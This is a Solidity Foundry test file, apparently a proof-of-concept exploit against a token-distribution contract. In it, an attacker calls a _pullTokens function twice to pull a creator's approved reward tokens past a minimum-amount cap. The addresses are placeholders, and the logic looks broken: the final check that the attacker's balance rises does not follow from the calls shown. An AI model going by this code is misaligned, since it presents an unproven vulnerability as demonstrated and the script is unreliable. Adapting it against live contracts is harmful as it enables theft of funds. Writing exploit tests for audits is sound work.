// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDistributionCreator {
    function _pullTokens(address creator, address rewardToken, uint256 campaignAmount, uint256 campaignAmountMinusFees) external;
    function creatorBalance(address creator, address rewardToken) external view returns (uint256);
    function creatorAllowance(address creator, address spender, address rewardToken) external view returns (uint256);
}

contract ExploitTest is Test {
    IDistributionCreator distributionCreator;
    IERC20 rewardToken;
    address attacker;
    address creator;
    address distributor;
    address feeRecipient;

    function setUp() public {
        // Deploy or fork contracts
        // Assuming the contracts are already deployed and we have their addresses
        distributionCreator = IDistributionCreator(0x1234567890abcdef1234567890abcdef12345678);
        rewardToken = IERC20(0xabcdefabcdefabcdefabcdefabcdefabcdefabcdef);
        attacker = address(0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef);
        creator = address(0xcafebabecafebabecafebabecafebabecafebabe);
        distributor = address(0xfeedfeedfeedfeedfeedfeedfeedfeedfeedfeed);
        feeRecipient = address(0xfacefacefacefacefacefacefacefacefaceface);

        // Fund the attacker with some tokens
        deal(address(rewardToken), attacker, 1000 ether);

        // Set initial state
        vm.prank(creator);
        rewardToken.approve(address(distributionCreator), type(uint256).max);
    }

    function test_exploit() public {
        // Initial balances
        uint256 initialCreatorBalance = distributionCreator.creatorBalance(creator, address(rewardToken));
        uint256 initialAttackerBalance = rewardToken.balanceOf(attacker);

        // Step 1: Attacker calls _pullTokens bypassing the rewardTokenMinAmounts cap
        vm.prank(attacker);
        distributionCreator._pullTokens(creator, address(rewardToken), 100 ether, 90 ether);

        // Step 2: Repeat the call to drain more tokens
        vm.prank(attacker);
        distributionCreator._pullTokens(creator, address(rewardToken), 100 ether, 90 ether);

        // Step 3: Check the balances to assert the exploit
        uint256 finalCreatorBalance = distributionCreator.creatorBalance(creator, address(rewardToken));
        uint256 finalAttackerBalance = rewardToken.balanceOf(attacker);

        // Assert the vulnerability
        assertLt(finalCreatorBalance, initialCreatorBalance);
        assertGt(finalAttackerBalance, initialAttackerBalance);
    }
}